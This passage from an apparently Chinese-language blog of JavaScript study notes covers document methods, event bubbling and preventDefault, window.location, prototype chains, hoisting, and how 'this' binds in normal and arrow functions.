<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-document-createattribute.html">document.createAttribute()</a></td>
<td align="left">创建一个属性节点</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-document-createcomment.html">document.createComment()</a></td>
<td align="left">createComment() 方法可创建注释节点。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-document-createdocumentfragment.html">document.createDocumentFragment()</a></td>
<td align="left">创建空的 DocumentFragment 对象，并返回此对象。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-document-createelement.html">document.createElement()</a></td>
<td align="left">创建元素节点。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-document-createtextnode.html">document.createTextNode()</a></td>
<td align="left">创建文本节点。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/prop-document-doctype.html">document.doctype</a></td>
<td align="left">返回与文档相关的文档类型声明 (DTD)。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/prop-document-documentelement.html">document.documentElement</a></td>
<td align="left">返回文档的根节点</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/prop-doc-documentmode.html">document.documentMode</a></td>
<td align="left">返回用于通过浏览器渲染文档的模式</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/prop-document-documenturi.html">document.documentURI</a></td>
<td align="left">设置或返回文档的位置</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/prop-doc-domain.html">document.domain</a></td>
<td align="left">返回当前文档的域名。</td>
</tr>
<tr>
<td align="left">document.domConfig</td>
<td align="left"><strong>已废弃</strong>。返回 normalizeDocument() 被调用时所使用的配置。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/coll-doc-embeds.html">document.embeds</a></td>
<td align="left">返回文档中所有嵌入的内容（embed）集合</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/coll-doc-forms.html">document.forms</a></td>
<td align="left">返回对文档中所有 Form 对象引用。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-document-getelementsbyclassname.html">document.getElementsByClassName()</a></td>
<td align="left">返回文档中所有指定类名的元素集合，作为 NodeList 对象。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-document-getelementbyid.html">document.getElementById()</a></td>
<td align="left">返回对拥有指定 id 的第一个对象的引用。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-doc-getelementsbyname.html">document.getElementsByName()</a></td>
<td align="left">返回带有指定名称的对象集合。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-document-getelementsbytagname.html">document.getElementsByTagName()</a></td>
<td align="left">返回带有指定标签名的对象集合。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/coll-doc-images.html">document.images</a></td>
<td align="left">返回对文档中所有 Image 对象引用。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/prop-document-implementation.html">document.implementation</a></td>
<td align="left">返回处理该文档的 DOMImplementation 对象。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-document-importnode.html">document.importNode()</a></td>
<td align="left">把一个节点从另一个文档复制到该文档以便应用。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/prop-document-inputencoding.html">document.inputEncoding</a></td>
<td align="left">返回用于文档的编码方式（在解析时）。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/prop-doc-lastmodified.html">document.lastModified</a></td>
<td align="left">返回文档被最后修改的日期和时间。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/coll-doc-links.html">document.links</a></td>
<td align="left">返回对文档中所有 Area 和 Link 对象引用。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-document-normalize.html">document.normalize()</a></td>
<td align="left">删除空文本节点，并连接相邻节点</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-document-normalizedocument.html">document.normalizeDocument()</a></td>
<td align="left">删除空文本节点，并连接相邻节点的</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-doc-open.html">document.open()</a></td>
<td align="left">打开一个流，以收集来自任何 document.write() 或 document.writeln() 方法的输出。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-document-queryselector.html">document.querySelector()</a></td>
<td align="left">返回文档中匹配指定的CSS选择器的第一元素</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-document-queryselectorall.html">document.querySelectorAll()</a></td>
<td align="left">document.querySelectorAll() 是 HTML5中引入的新方法，返回文档中匹配的CSS选择器的所有元素节点列表</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/prop-doc-readystate.html">document.readyState</a></td>
<td align="left">返回文档状态 (载入中……)</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/prop-doc-referrer.html">document.referrer</a></td>
<td align="left">返回载入当前文档的文档的 URL。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-document-removeeventlistener.html">document.removeEventListener()</a></td>
<td align="left">移除文档中的事件句柄(由 addEventListener() 方法添加)</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-document-renamenode.html">document.renameNode()</a></td>
<td align="left">重命名元素或者属性节点。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/coll-doc-scripts.html">document.scripts</a></td>
<td align="left">返回页面中所有脚本的集合。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/prop-document-stricterrorchecking.html">document.strictErrorChecking</a></td>
<td align="left">设置或返回是否强制进行错误检查。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/prop-doc-title.html">document.title</a></td>
<td align="left">返回当前文档的标题。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/prop-doc-url.html">document.URL</a></td>
<td align="left">返回文档完整的URL</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-doc-write.html">document.write()</a></td>
<td align="left">向文档写 HTML 表达式 或 JavaScript 代码。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-doc-writeln.html">document.writeln()</a></td>
<td align="left">等同于 write() 方法，不同的是在每个表达式之后写一个换行符。</td>
</tr>
</tbody></table>
<h3 id="11、JS中阻止冒泡事件"><a href="#11、JS中阻止冒泡事件" class="headerlink" title="11、JS中阻止冒泡事件"></a>11、JS中阻止冒泡事件</h3><p>冒泡事件：比如说鼠标点击了一个按钮，同样的事件将会在那个元素的所有祖先元素中被触发。这一过程被称为事件冒泡。</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>按钮<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
	<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.btn'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'按钮被点击了'</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.box'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'box被点击了'</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当我们点击按钮后，因为按钮也属于.box元素，所以按钮的父元素.box也会触发点击事件</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.btn'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">even</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	even<span class="token punctuation">.</span><span class="token function">stopPropagation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'按钮被点击了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="12、阻止默认事件"><a href="#12、阻止默认事件" class="headerlink" title="12、阻止默认事件"></a>12、阻止默认事件</h3><pre class="line-numbers language-none"><code class="language-none">&lt;a href&#x3D;&quot;javascript:;&quot;&gt;链接&lt;&#x2F;a&gt;

&lt;a href&#x3D;&quot;javascript:void(0);&quot;&gt;链接&lt;&#x2F;a&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-none"><code class="language-none">&lt;a href&#x3D;&quot;&quot; id&#x3D;&quot;link&quot;&gt;链接&lt;&#x2F;a&gt;

&lt;script&gt;
        document.getElementById(&quot;link&quot;).onclick &#x3D; function ()&#123;
            console.log(&quot;666&quot;);
            return false;
        &#125;
&lt;&#x2F;script&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-none"><code class="language-none">&lt;a href&#x3D;&quot;&quot; id&#x3D;&quot;link&quot;&gt;链接&lt;&#x2F;a&gt;

&lt;script&gt;
    document.getElementById(&quot;link&quot;).onclick &#x3D; function (e)&#123;
        console.log(&quot;666&quot;);
        e.preventDefault();
    &#125;
&lt;&#x2F;script&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="13、window-location"><a href="#13、window-location" class="headerlink" title="13、window.location"></a>13、window.location</h3><h4 id="Location-对象属性"><a href="#Location-对象属性" class="headerlink" title="Location 对象属性"></a>Location 对象属性</h4><table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/jsref/prop_loc_hash.asp">hash</a></td>
<td align="left">设置或返回从井号 (#) 开始的 URL（锚）。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/jsref/prop_loc_host.asp">host</a></td>
<td align="left">设置或返回主机名和当前 URL 的端口号。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/jsref/prop_loc_hostname.asp">hostname</a></td>
<td align="left">设置或返回当前 URL 的主机名。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/jsref/prop_loc_href.asp">href</a></td>
<td align="left">设置或返回完整的 URL。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/jsref/prop_loc_pathname.asp">pathname</a></td>
<td align="left">设置或返回当前 URL 的路径部分。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/jsref/prop_loc_port.asp">port</a></td>
<td align="left">设置或返回当前 URL 的端口号。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/jsref/prop_loc_protocol.asp">protocol</a></td>
<td align="left">设置或返回当前 URL 的协议。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/jsref/prop_loc_search.asp">search</a></td>
<td align="left">设置或返回从问号 (?) 开始的 URL（查询部分）。</td>
</tr>
</tbody></table>
<h4 id="Location-对象方法"><a href="#Location-对象方法" class="headerlink" title="Location 对象方法"></a>Location 对象方法</h4><table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/jsref/met_loc_assign.asp">assign()</a></td>
<td align="left">加载新的文档。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/jsref/met_loc_reload.asp">reload()</a></td>
<td align="left">重新加载当前文档。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/jsref/met_loc_replace.asp">replace()</a></td>
<td align="left">用新的文档替换当前文档。</td>
</tr>
</tbody></table>
<h3 id="14、原型与原型链"><a href="#14、原型与原型链" class="headerlink" title="14、原型与原型链"></a>14、原型与原型链</h3><h4 id="原型-prototype"><a href="#原型-prototype" class="headerlink" title="原型 prototype"></a>原型 prototype</h4><p>原型是函数特有</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>
     <span class="token keyword">function</span> <span class="token function">fu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>

     <span class="token punctuation">&#125;</span>
     fu<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'kif'</span>
     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fu<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
 <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>挂载在原型上是为了继承(通过new)</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846409.png" alt="image-20220313141218874"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846610.png" alt="image-20220313143722625"></p>
<p>继承后查找时就近，</p>
<p>判断属性时继承的还是后天添加的：hasOwnProperty</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846172.png" alt="image-20220313144106245"></p>
<p>可以拿到p1的私有属性</p>
<p>这个方法既不是Persion也不是p1的，而是Persion继承自Object的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846687.png" alt="image-20220313144302492"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846218.png" alt="image-20220313144416164"></p>
<h4 id="原型链：-proto"><a href="#原型链：-proto" class="headerlink" title="原型链：_proto_"></a>原型链：_proto_</h4><p>对象，数组，函数等有原型链</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310847761.png" alt="image-20220313140745799"></p>
<h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
	<span class="token keyword">var</span> a <span class="token operator">=</span><span class="token number">123</span><span class="token punctuation">;</span>
	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
	<span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token keyword">var</span>  d <span class="token operator">=</span><span class="token number">678</span>
	<span class="token punctuation">&#125;</span>
	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>
	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>
	<span class="token keyword">var</span> <span class="token function-variable function">b</span> <span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>
	<span class="token keyword">function</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>
<span class="token function">fn</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 预编译步骤：</p>
<ol>
<li><p>创建AO对象</p>
<pre class="line-numbers language-none"><code class="language-none">AO：&#123;

&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>


</li>
<li><p>找形参和变量声明</p>
<pre class="line-numbers language-none"><code class="language-none">AO：&#123;
	a:undefind
	c:undefind
	d:undefind
	bLundefind
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


</li>
<li><p>实参与形参相统一</p>
<pre class="line-numbers language-none"><code class="language-none">AO：&#123;
	a:2
	c:3
	d:undefind
	b:undefind
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


</li>
<li><p>找函数申明（会覆盖变量）</p>
<pre class="line-numbers language-none"><code class="language-none">AO：&#123;
	a:function a()&#123;&#125;
	c:function c()&#123;&#125;
	d:undefind
	b:undefind
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注:var b &#x3D;function(){}不是函数声明</p>
</li>
<li><p>逐行执行</p>
<pre class="line-numbers language-none"><code class="language-none">function fn(a,c)&#123;
	console.log(a)&#x2F;&#x2F;function a()&#123;&#125;
	var a &#x3D;123;
	console.log(a)&#x2F;&#x2F;123
	console.log(c)&#x2F;&#x2F;function c()&#123;&#125;
	function a()&#123;&#125;
	if(false)&#123;
		var  d &#x3D;678
	&#125;
	console.log(d)&#x2F;&#x2F;undefind
	console.log(b)&#x2F;&#x2F;undefind
	var b &#x3D;function()&#123;&#125;
	console.log(b)&#x2F;&#x2F;function()&#123;&#125;
	function c()&#123;&#125;
	console.log(c)&#x2F;&#x2F;function c()&#123;&#125;
&#125;
fn(2,3)

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310847985.png" alt="image-20220313175244724"></p>
</li>
</ol>
<h3 id="15、this"><a href="#15、this" class="headerlink" title="15、this"></a>15、this</h3><h4 id="函数直接调用"><a href="#函数直接调用" class="headerlink" title="函数直接调用"></a>函数直接调用</h4><pre class="line-numbers language-none"><code class="language-none">function get(a)&#123;
    console.log(a)
&#125;
get(&#39;kif&#39;)
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中 <strong>get(‘kif’)</strong> 其实是<strong>get.call(window,’kif’ )</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310847478.png" alt="image-20220313181429301"></p>
<p>即：对象.方法.call(对象，参数)</p>
<h4 id="对象方法"><a href="#对象方法" class="headerlink" title="对象方法"></a>对象方法</h4><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> Persion <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'kif'</span><span class="token punctuation">,</span>
    <span class="token function-variable function">getName</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">time</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>time<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
Persion<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token number">299</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同理：</p>
<p>Persion.getName(299)为：Persion.getName.call(Persion,299)</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310847377.png" alt="image-20220313181905131"></p>
<h4 id="案例："><a href="#案例：" class="headerlink" title="案例："></a>案例：</h4><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> name <span class="token operator">=</span> <span class="token number">222</span>
<span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">name</span> <span class="token operator">:</span><span class="token number">111</span><span class="token punctuation">,</span>
    <span class="token function-variable function">say</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">var</span> fun <span class="token operator">=</span> a<span class="token punctuation">.</span>say
<span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//fun.call(window,)======>222</span>
a<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//a.say.call(a,)=======>111</span>
<span class="token keyword">var</span> b <span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span><span class="token number">333</span><span class="token punctuation">,</span>
    <span class="token function-variable function">say</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">fun</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//fun.call(window,)//222</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
b<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>say<span class="token punctuation">)</span><span class="token comment">//</span>
b<span class="token punctuation">.</span>say<span class="token operator">=</span>a<span class="token punctuation">.</span>say
b<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//b.say.call(b,)=======>333</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="箭头函数中this"><a href="#箭头函数中this" class="headerlink" title="箭头函数中this"></a>箭头函数中this</h4><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> x <span class="token operator">=</span><span class="token number">11</span>
<span class="token keyword">var</span> p <span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">x</span><span class="token operator">:</span><span class="token number">22</span><span class="token punctuation">,</span>
    <span class="token function-variable function">say</span><span class="token operator">:</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>x<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
p<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>箭头函数中this固定指向代码块外部</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310847387.png" alt="image-20220313185716281"></p>
<h4 id="this指向（普通函数、箭头函数）"><a href="#this指向（普通函数、箭头函数）" class="headerlink" title="this指向（普通函数、箭头函数）"></a>this指向（普通函数、箭头函数）</h4><p><strong>参考答案：</strong></p>
<p>普通函数中的this</p>
<ol>
<li>谁调用了函数或者方法，那么这个函数或者对象中的this就指向谁</li>
</ol>
